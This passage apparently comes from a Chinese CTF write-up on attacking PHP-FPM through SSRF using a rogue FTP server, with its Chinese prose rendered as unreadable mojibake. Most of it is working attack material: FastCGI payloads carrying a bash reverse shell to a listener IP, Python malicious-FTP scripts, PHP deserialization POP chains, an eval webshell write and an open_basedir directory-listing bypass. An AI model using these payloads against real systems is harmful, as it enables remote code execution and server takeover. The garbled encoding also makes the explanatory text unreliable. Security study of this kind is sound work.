0&gt;&amp;1\" è¿™é‡Œæˆ‘ä»¬åªéœ€è¦æˆªå–_ç¬¦å·åé¢çš„å†…å®¹ %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 è®¾ç½®å¥½ç›‘å¬ï¼Œç„¶åç¼–å†™å¦‚ä¸‹è„šæœ¬ï¼ˆè„šæœ¬æ˜¯ä»ç½‘ä¸Šæ‰¾çš„ï¼‰ï¼Œåœ¨æ”»å‡»æœºä¸Šæ­å»ºä¸€ä¸ªæ¶æ„çš„ftpæœåŠ¡ï¼Œå¹¶å°†ä¸Šé¢çš„payloadä¸­çš„æ•°æ®æ›¿æ¢æ‰ä¸‹é¢ftpè„šæœ¬ä¸­çš„payloadçš„å†…å®¹ï¼š import socket from urllib.parse import unquote # å¯¹gopherusç”Ÿæˆçš„payloadè¿›è¡Œä¸€æ¬¡urldecode payload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\") payload = payload.encode('utf-8') host = '0.0.0.0' port = 23 sk = socket.socket() sk.bind((host, port)) sk.listen(5) # ftpè¢«åŠ¨æ¨¡å¼çš„passvie port,ç›‘å¬åˆ°1234 sk2 = socket.socket() sk2.bind((host, 1234)) sk2.listen() # è®¡æ•°å™¨ï¼Œç”¨äºåŒºåˆ†æ˜¯ç¬¬å‡ æ¬¡ftpè¿æ¥ count = 1 while 1: conn, address = sk.accept() conn.send(b\"200 \") print(conn.recv(20)) # USER aaa\\r å®¢æˆ·ç«¯ä¼ æ¥ç”¨æˆ·å if count == 1: conn.send(b\"220 ready \") else: conn.send(b\"200 ready \") print(conn.recv(20)) # TYPE I\\r å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯ä»¥ä»€ä¹ˆæ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒTYPE Iè¡¨ç¤ºäºŒè¿›åˆ¶ï¼Œ TYPE Aè¡¨ç¤ºæ–‡æœ¬ if count == 1: conn.send(b\"215 \") else: conn.send(b\"200 \") print(conn.recv(20)) # SIZE /123\\r å®¢æˆ·ç«¯è¯¢é—®æ–‡ä»¶/123çš„å¤§å° if count == 1: conn.send(b\"213 3 \") else: conn.send(b\"300 \") print(conn.recv(20)) # EPSV\\r ' conn.send(b\"200 \") print(conn.recv(20)) # PASV\\r å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è¿›å…¥è¢«åŠ¨è¿æ¥æ¨¡å¼ if count == 1: conn.send(b\"227 192,168,246,130,4,210 \") # æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234 else: conn.send(b\"227 127,0,0,1,0,9000 \") # ç«¯å£è®¡ç®—è§„åˆ™ï¼š35*256+40=9000 print(conn.recv(20)) # ç¬¬ä¸€æ¬¡è¿æ¥ä¼šæ”¶åˆ°å‘½ä»¤RETR /123\\r ï¼Œç¬¬äºŒæ¬¡è¿æ¥ä¼šæ”¶åˆ°STOR /123\\r if count == 1: conn.send(b\"125 \") # å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥å¼€å§‹æ•°æ®è¿æ¥äº† # æ–°å»ºä¸€ä¸ªsocketç»™æœåŠ¡ç«¯è¿”å›æˆ‘ä»¬çš„payload print(\"å»ºç«‹è¿æ¥!\") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(\"æ–­å¼€è¿æ¥!\") else: conn.send(b\"150 \") print(conn.recv(20)) exit() # ç¬¬ä¸€æ¬¡è¿æ¥æ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯ä¸‹è½½å·²ç»ç»“æŸ if count == 1: conn.send(b\"226 \") conn.close() count += 1 è¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œä¸€ä¸ªæ¶æ„ftpæœåŠ¡å°±èµ·æ¥äº†ï¼š è¿™ä¸ªè„šæœ¬åšçš„äº‹æƒ…å¾ˆç®€å•ï¼Œå°±æ˜¯å½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¿æ¥çš„æ—¶å€™è¿”å›æˆ‘ä»¬é¢„è®¾çš„ payloadï¼›å½“å®¢æˆ·ç«¯ç¬¬äºŒæ¬¡è¿æ¥çš„æ—¶å€™å°†å®¢æˆ·ç«¯çš„è¿æ¥é‡å®šå‘åˆ° 127.0.0.1:9000ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡ä¸»æœºä¸Š php-fpm æœåŠ¡çš„ç«¯å£ï¼Œä»è€Œé€ æˆ SSRFï¼Œæ”»å‡»å…¶ php-fpmã€‚ æˆ‘è®¤ä¸ºä¸Šè¿°å¤šæ¬¡è¿æ¥çš„è¿‡ç¨‹å¯ä»¥å‚è€ƒï¼šFTPè¿æ¥è¿‡ç¨‹è¯¦è§£ æœ€åï¼Œæ„é€ å¦‚ä¸‹è¯·æ±‚ï¼Œè§¦å‘æ”»å‡»ï¼š /ssrf.php?viewFile=ftp://aaa@192.168.246.130:23/123 è¿™é‡Œä¹Ÿæ˜¯è¸©äº†ä¸ªå·¨å‘ï¼Œtmç›´æ¥æµªè´¹äº†æˆ‘ä¸¤ä¸ªå°æ—¶ï¼Œé—®é¢˜ç‚¹åœ¨è¿™ conn.send(b\"227 192,168,246,130,4,210 \") # æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234 else: conn.send(b\"227 127,0,0,1,0,9000 \") # ç«¯å£è®¡ç®—è§„åˆ™ï¼š35*256+40=9000 ä¸Šé¢ä»£ç ç¬¬ä¸€ä¸ªsendå‘é€çš„ipåº”è¯¥ä¸ºæˆ‘ä»¬æ­å»ºæ¶æ„ftpæœåŠ¡å™¨æ‰€åœ¨çš„ipï¼Œè€Œæˆ‘å½“æ—¶ä¸€ç›´ç”¨çš„127.0.0.1ï¼Œå¾ˆæ˜¾ç„¶è¿™æ˜¯å‘ä»–è‡ªå·±å†…éƒ¨è®¿é—®1234ç«¯å£ã€‚ã€‚ã€‚ã€‚åŸæ¥é‚£ä½å¸ˆå‚…æ­å»ºçš„ç¯å¢ƒéƒ½æ˜¯åœ¨è‡ªå·±æœ¬æœºä¸Šã€‚ã€‚ã€‚ã€‚çŠ¯è¿™ç§é”™è¯¯çœŸå®å¾ˆæ»‘ç¨½ã€‚ã€‚ã€‚ æœ€åä¹Ÿæ˜¯æˆåŠŸåå¼¹shell(å‘œå‘œ~~~~) å‡è®¾æœ‰ä»¥ä¸‹ä»£ç ï¼š &lt;?php file_put_contents($_GET['file'], $_GET['data']); ç»æµ‹è¯•ç›®æ ‡ä¸»æœºçš„ 9000 ç«¯å£ä¸Šå­˜åœ¨ PHP-FPM ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ä¸åˆšæ‰ç›¸ä¼¼çš„åŸç†ï¼Œé€šè¿‡æ­å»ºæ¶æ„çš„ ftp æœåŠ¡å™¨æ¥æ”»å‡» PHP-FPMã€‚ é¦–å…ˆè¿˜æ˜¯ä½¿ç”¨ gopherus ç”Ÿæˆpayloadï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼Œå¾—åˆ°çš„payloadåªæˆªå– _ åé¢çš„æ•°æ®éƒ¨åˆ†ã€‚ ç„¶åå†æ”»å‡»æœºä¸Šæ‰§è¡Œä»¥ä¸‹pythonè„šæœ¬æ­å»ºä¸€ä¸ªæ¶æ„çš„ ftp æœåŠ¡å™¨ï¼š import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() å¹¶åœ¨ vps ä¸Šå¼€å¯ä¸€ä¸ª nc ç›‘å¬ï¼Œç”¨äºæ¥æ”¶åå¼¹çš„shellï¼Œæœ€åæ„é€  url å‘é€ payload å³å¯ï¼š æˆåŠŸåå¼¹shell 0x04 é¢˜ç›®å®æˆ˜ é™‡åŸæˆ˜\"ç–«\"-eaaasyphp &lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint { public function __wakeup(){ $this-&gt;hint = \"no hint\"; } public function __destruct(){ if(!$this-&gt;hint){ $this-&gt;hint = \"phpinfo\"; ($this-&gt;hint)(); } } } class Bunny { public function __toString() { if (Check::$str2) { if(!$this-&gt;data){ $this-&gt;data = $_REQUEST['data']; } file_put_contents($this-&gt;filename, $this-&gt;data); } else { throw new Error(\"Error\"); } } } class Welcome { public function __invoke() { Check::$str2 = true; return \"Welcome\" . $this-&gt;username; } } class Bypass { public function __destruct() { if (Check::$str1) { ($this-&gt;str4)(); } else { throw new Error(\"Error\"); } } } if (isset($_GET['code'])) { unserialize($_GET['code']); } else { highlight_file(__FILE__); } è¿™é‡Œæµè§ˆä¸€éä¼šå‘ç°ï¼Œæ•æ„Ÿå‡½æ•°ä¼¼ä¹æ˜¯file_put_contents($this-&gt;filename, $this-&gt;data);è¿™é‡Œçš„ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯åˆ†æé“¾å­äº†ã€‚ ä¸éš¾åˆ†æå‡ºä»¥ä¸‹é“¾å­ï¼šBypass.__destruct()-&gt;Wecolme.__invoke()-&gt;Bunny.__toString() ä½†è¿™ä¸ªHintå‡½æ•°ï¼Œéœ€è¦ç»•è¿‡wakeupï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹phpç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ä¸º7.2.20ï¼Œé‚£è¿™é‡Œä¿®æ”¹å±æ€§å€¼ä¸ºå…¶ä»–æ•´æ•°æ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œçœ‹äº†å‡ ä¸ªwpå‘ç°ä¿®æ”¹ä¸ºè´Ÿæ•°å³å¯ å¹¶ä¸”è¿™é‡Œäº‹åè¯¸è‘›äº®ä¸€ä¸‹ï¼Œè¿™é‡Œå°è¯•å†™å…¥æ–‡ä»¶ä¼šå‘ç°ä¸æˆåŠŸï¼Œé‚£æˆ‘ä»¬å°±è”æƒ³åˆ°äº†é¢˜ç›®ç»™çš„hintï¼šphpinfoï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹phpinfoå…¶ä¸­æœ‰ä»€ä¹ˆä¿¡æ¯ O:4:\"Hint\":0:{}-&gt;O:4:\"Hint\":-1:{} æˆåŠŸä¹‹åæˆ‘ä»¬çœ‹åˆ°å…¶ä¸­å¼€å¯äº†FastCGIæœåŠ¡ï¼Œé‚£ä¸æˆ‘ä»¬åˆšåˆšå­¦çš„å¯¹ä¸Šäº†ï¼Œè€Œä¸”æ°å¥½åˆæœ‰file_put_contents($this-&gt;filename, $this-&gt;data);çš„å­˜åœ¨ï¼Œè¿™æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼Œæ¥ä¸‹æ¥æ„é€ å®Œæ•´popé“¾å­ &lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint{ } class Bunny { public $data; public $filename; } class Welcome { public $username; } class Bypass { public $str4; public $hybcx; } $pop1 = new Bypass(); $pop1-&gt;str4 = new Welcome(); $pop1-&gt;hybcx = new Esle(); $pop1-&gt;str4-&gt;username = new Bunny(); $pop1-&gt;str4-&gt;username-&gt;filename = 'ftp://aaa@ip:23/123'; echo urlencode(serialize($pop1)); ?&gt; è¿™é‡Œå¯ä»¥ç¡®å®šå…¶/var/www/html/index.phpæ˜¯å­˜åœ¨çš„ï¼Œç›´æ¥åˆ©ç”¨gopherusæ‰“ bash -c \"bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1\" å–_åé¢çš„ %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 åˆ©ç”¨å¦‚ä¸‹æ¶æ„æ–‡ä»¶åœ¨æˆ‘ä»¬vpså¼€å¯ftpæœåŠ¡ import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() è¿™é‡Œç”±äºåœ¨æˆ‘ä»¬çœŸæ­£æƒ³è®©å…¶è¯·æ±‚ä¹‹å‰åªä¼ ç»™è¿‡urlï¼Œé‚£åªéœ€è¦ç¼–ç ä¸€æ¬¡å³å¯ï¼Œæœ€ååœ¨vpsä¸Šå¼€å¯ftpæœåŠ¡ï¼Œè¿˜æœ‰ç›‘å¬ç«¯å£ï¼ˆæ³¨æ„å¼€æ”¾ç«¯å£ï¼‰ï¼Œæ¥ç€å‘urlä¼ å…¥å¦‚ä¸‹ï¼š æ³¨æ„è¿™é‡Œçš„dataæˆ‘åœ¨urlè¿›è¡Œgetä¼ å‚äº†ï¼Œå¦‚ä¸‹å›¾æˆåŠŸæ‹¿åˆ°flag è“å¸½æ¯_2021_One_Pointer_PHP å‘ç°è¿™é“é¢˜è€ƒç‚¹è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œæˆ‘å‡ ä¹éƒ½æ²¡è§è¿‡ã€‚ã€‚ã€‚ã€‚ é¦–å…ˆé¢˜ç›®ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ #add_api.php &lt;?php include \"user.php\"; if($user=unserialize($_COOKIE[\"data\"])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(\"data\",serialize($user)); }else{ eval($_GET[\"backdoor\"]); } }else{ $user=new User; $user-&gt;count=1; setcookie(\"data\",serialize($user)); } ?&gt; #user.php &lt;?php class User{ public $count; } ?&gt; è¿™é‡Œè¯´åªæœ‰$count[]=1ä¸æˆç«‹çš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¿›è¡Œevalå‘½ä»¤æ‰§è¡Œï¼Œä½†è¿™é‡Œæ˜æ˜¾æ˜¯èµ‹å€¼ä¸º1ï¼Œè‚¯å®šæ’ä¸ºtrueï¼Œæ‰€ä»¥ä¸çŸ¥é“å¦‚ä½•ç»•è¿‡äº†ã€‚çœ‹äº†wpå‘ç°æ˜¯åˆ©ç”¨PHPæ•°ç»„æº¢å‡ºï¼Œå…·ä½“å¯ä»¥å‚è€ƒï¼šPHPæ•°ç»„çš„keyæº¢å‡ºé—®é¢˜ --ä½†è¿™ä¸ªåŸç†åˆ†æçš„æˆ‘è®¤ä¸ºå’Œå¦‚ä½•ç»•è¿‡å¹¶æ— å¤ªå¤§å…³ç³»ï¼Œéšåç»§ç»­ç¿»æ–‡ç« ç»ˆäºæ‰¾åˆ°ä¸€ä¸ªå®Œç¾çš„è§£é‡Šï¼š æˆ‘ä»¬ç¿»é˜…å®˜æ–¹æ–‡æ¡£å¯ä»¥å‘ç°ï¼šPHPæ•°ç»„ å…¶å¯¹æ•°ç»„çš„é”®å€¼åšäº†ä»¥ä¸‹è§£é‡Šï¼š key ä¸ºå¯é€‰é¡¹ã€‚å¦‚æœæœªæŒ‡å®šï¼ŒPHP å°†è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰ç”¨è¿‡çš„æœ€å¤§ integer é”®ååŠ ä¸Š 1 ä½œä¸ºæ–°çš„é”®åã€‚ å¦‚æœç»™å‡ºæ–¹æ‹¬å·ä½†æ²¡æœ‰æŒ‡å®šé”®åï¼Œåˆ™å–å½“å‰æœ€å¤§ int ç´¢å¼•å€¼ï¼Œæ–°çš„é”®åå°†æ˜¯è¯¥å€¼åŠ ä¸Š 1ï¼ˆä½†æ˜¯æœ€å°ä¸º 0ï¼‰ã€‚å¦‚æœå½“å‰è¿˜æ²¡æœ‰ int ç´¢å¼•ï¼Œåˆ™é”®åå°†ä¸º 0 ã€‚ è¿›è¡Œä¸€ä¸ªç®€å•æµ‹è¯•ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°é”®å€¼åœ¨é€æ¸è‡ªå¢ï¼Œé‚£è¿™æ ·çš„è¯å°±å¾ˆå®¹æ˜“è”ç³»åˆ°PHPæ•°ç»„æº¢å‡ºäº† åœ¨ä¸Šè¿°æ–‡ç« ä¸­ä¹Ÿè¯´åˆ°ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“keyå€¼æ¯”è¾ƒå°æ˜¯æ²¡æœ‰é—®é¢˜ï¼Œå½“keyå€¼å¾ˆå¤§æ—¶è¾“å‡ºçš„å€¼æº¢å‡ºäº†ï¼Œä¸´ç•Œç‚¹æ˜¯9223372036854775807è¿™ä¸ªæ•°å­—ã€‚ ä¹Ÿå°±æ˜¯å¤§äºè¿™ä¸ªä¸´ç•Œç‚¹çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬å†ç®€å•æµ‹è¯•ä¸€ç•ªï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æ­¤æ—¶çˆ†å‡ºè­¦å‘Šï¼Œä¸”æœ€ç»ˆæ‰“å°å‡ºæ¥çš„ä¸ºNULLï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç»•è¿‡äº† ä½†ç”±äºä¸‹å›¾ä¸­è¿™ä¸€æ­¥çš„è‡ªå¢ï¼Œæˆ‘ä»¬éœ€è¦ç»™countèµ‹å€¼ä¸ºä¸´ç•Œç‚¹-1 &lt;?php class User { public $count; } $pop = new User(); $pop-&gt;count = 9223372036854775806; echo urlencode(serialize($pop)); ?&gt; å°†å¾—åˆ°çš„æ•°å€¼ä¼ ç»™cookieçš„dataï¼ŒåŒæ—¶backdoorè¯»å–phpinfo å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸç»•è¿‡ï¼Œä¸”æˆ‘ä»¬ä¹Ÿçœ‹åˆ°äº†ç†Ÿæ‚‰çš„FastCGIæœåŠ¡ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯è·Ÿç€åšé¢˜æ€è·¯èµ°ï¼Œæ¯•ç«Ÿæˆ‘ä»¬è¿™æ˜¯äº‹åè¯¸è‘›äº®ã€‚é‚£è¿™é‡Œæˆ‘ä»¬æˆåŠŸç»•è¿‡ï¼Œä¹‹åè‚¯å®šæƒ³ç€åˆ©ç”¨evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦å¾—çŸ¥å…¶ç¦ç”¨äº†å“ªäº›å‡½æ•° å¯ä»¥çœ‹åˆ°ä½ ç”¨çš„å¾ˆå¤šï¼Œä½†æ˜¯å¯ä»¥å‘ç°æ²¡æœ‰ç¦ç”¨file_get_content/putç­‰æ–‡ä»¶è¯»å–å‡½æ•°è¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨putè¿›è¡Œæœ¨é©¬å†™å…¥ ?backdoor=file_put_content('shell.php', '&lt;?php @eval($_POST[1]);?&gt;'); è¿™é‡Œé¢æˆ‘å†™å…¥ä¹‹åä¹Ÿé¡µé¢æµ‹è¯•çš„å¥½å¥½çš„ï¼Œä½†èšå‰‘å°±æ˜¯æ­»æ´»è¿ä¸ä¸Šï¼Œç»“æœæµªè´¹äº†ä¸¤ä¸ªå°æ—¶ï¼Œå‘ç°tmåˆæ˜¯æ ¡å›­ç½‘çš„åŸå› ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚çœŸæå¿ƒæ€ï¼æœ€åæ¢äº†çƒ­ç‚¹å‘ç°æˆåŠŸï¼Œéšåçœ‹äº†æ ¹ç›®å½•ç­‰ç­‰ï¼Œä½†éƒ½å‘ç°æ–‡ä»¶é‡Œé¢æ²¡æœ‰ä¸œè¥¿ é‚£æˆ‘ä»¬åœ¨ç ”ç©¶ä¸€ä¸‹æ˜¯å¦phpinfoæ¼æ‰äº†ä»€ä¹ˆä¸œè¥¿ï¼Œå¦‚ä¸‹å›¾è¿™é‡Œé¢å«æœ‰open_basedirï¼Œç®€å•äº†è§£ä¸€ä¸‹è¯¥å‡½æ•°çš„ä½œç”¨ åœ¨pç¥çš„æ€»ç»“ä¸‹ï¼Œé‚£å°±æ˜¯ï¼šopen_basediræ˜¯PHPè®¾ç½®ä¸­ä¸ºäº†é˜²å¾¡PHPè·¨ç›®å½•è¿›è¡Œæ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯»å†™çš„æ–¹æ³•ï¼Œæ‰€æœ‰PHPä¸­æœ‰å…³æ–‡ä»¶çš„è¯»ã€å†™çš„å‡½æ•°éƒ½ä¼šç»è¿‡å®ƒçš„æ£€æŸ¥ï¼ŒOpen_basedirå®é™…ä¸Šæ˜¯ä¸€äº›ç›®å½•çš„é›†åˆï¼Œåœ¨å®šä¹‰äº†open_basedirä»¥åï¼Œphpå¯ä»¥è¯»å†™çš„æ–‡ä»¶ã€ç›®å½•éƒ½å°†è¢«é™åˆ¶åœ¨è¿™äº›ç›®å½•ä¸­ã€‚â€“ä¹Ÿå°±æ˜¯å¯¹åº”è¿™é“é¢˜ï¼Œæˆ‘ä»¬åªèƒ½è¯»å†™/var/www/htmlç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ è®¾ç½®open_basedirçš„æ–¹æ³•ï¼Œåœ¨linuxä¸‹ï¼Œä¸åŒçš„ç›®å½•ç”±â€œ:â€åˆ†å‰²ï¼Œå¦‚â€œ/var/www/:/tmp/â€ï¼›åœ¨Windowsä¸‹ä¸åŒç›®å½•ç”±â€œ;â€åˆ†å‰²ï¼Œå¦‚â€œc:/www;c:/windows/tempâ€ã€‚ è¿™é‡Œpç¥ä¹Ÿè¯´äº†ç»•è¿‡open_basedirä¹‹åå‡ ä¹æ˜¯ç”¨æ¥è¿›è¡Œç›®å½•çš„åˆ—ä¸¾ä¸éå†ï¼Œè€Œå¹¶éå…·ä½“çš„æ–‡ä»¶è¯»å†™ï¼Œå› ä¸ºåœ¨php5.3ä»¥åå¾ˆå°‘æœ‰èƒ½å¤Ÿç»•è¿‡open_basedirè¯»å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚æ‡’å¾—å†å¼€æ–‡ç« äº†ï¼Œç´¢æ€§å°±åœ¨è¿™é‡ŒæŒç»­å­¦ä¹ äº†ã€‚è¿™é‡Œæˆ‘ä»¬æ ¹æ®pç¥çš„æ–‡ç« æ¥å­¦ä¹ ä¸€æ³¢å¦‚ä½•ç»•è¿‡open_basedirã€‚ open_basedirç»•è¿‡ DirectoryIterator + Glob åˆ—ä¸¾ç›®å½• DirectoryIteratoræ˜¯PHP 5ä¹‹åæ·»åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£ã€‚è€Œglobï¼šæ•°æ®æµåŒ…è£…å™¨æ˜¯ä»PHP 5.3.0å¼€å§‹æœ‰æ•ˆçš„ï¼Œç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„ã€‚ ä¸Špayloadï¼š &lt;?php // è¾“å‡ºå½“å‰PHPé…ç½®ä¸­çš„open_basedirå€¼ï¼Œopen_basediré™åˆ¶è„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šçš„ç›®å½•åŠå…¶å­ç›®å½•ã€‚ printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); // åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶åˆ—è¡¨ã€‚ $file_list = array(); // DirectoryIteratoræ˜¯PHPçš„å†…ç½®ç±»ï¼Œå¯ä»¥ç”¨äºéå†æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ // ä»£ç ä¸­ä½¿ç”¨glob:///*æ¥åˆ—å‡ºç”±globå‡½æ•°æ”¯æŒçš„æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶ã€‚ $it = new DirectoryIterator(\"glob:///*\"); // éå†DirectoryIteratorè¿”å›çš„æ¯ä¸ªæ–‡ä»¶ï¼ˆæ–‡ä»¶åï¼‰ foreach($it as $f) { // å°†æ–‡ä»¶åæ·»åŠ åˆ°$file_listæ•°ç»„ä¸­ï¼Œ$f-&gt;__toString()è¿”å›å½“å‰éå†åˆ°çš„æ–‡ä»¶çš„è·¯å¾„åã€‚ $file_list[] = $f-&gt;__toString(); } //è¿™æ¬¡æ˜¯ä¸ºäº†éå†éšè—æ–‡ä»¶ï¼ˆä»¥.å¼€å¤´çš„ç‰¹æ®Šæ–‡ä»¶ï¼‰ã€‚åŒæ ·ä¹Ÿä½¿ç”¨äº†glob://åè®®ã€‚ $it = new DirectoryIterator(\"glob:///.*\"); //åŒç† foreach($it as $f) { $file_list[] = $f-&gt;__toString(); } //è¿›è¡Œæ–‡ä»¶åçš„æ’åºï¼Œä¸ºäº†ç¾è§‚ sort($file_list); //è¾“å‡ºå¾—åˆ°çš„æ‰€æœ‰æ–‡ä»¶ foreach($file_list as $f){ echo \"{$f}&lt;br/&gt;\"; } ?&gt; è¿™é‡Œè·Ÿç€GPTå­¦ä¹ ä¸€æ³¢ä¸Šè¿°ä»£ç çš„é€»è¾‘ï¼Œè¿™é‡Œæ‡’å¾—é…ç¯å¢ƒäº†ï¼Œå°±ç›´æ¥å€Ÿç”¨pç¥çš„äº†~~~ æ‰§è¡Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œopen_basedirä¸º/usr/share/nginx/www/:/tmp/ï¼Œä½†æˆ‘ä»¬æˆåŠŸåˆ—ä¸¾äº†/æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼š 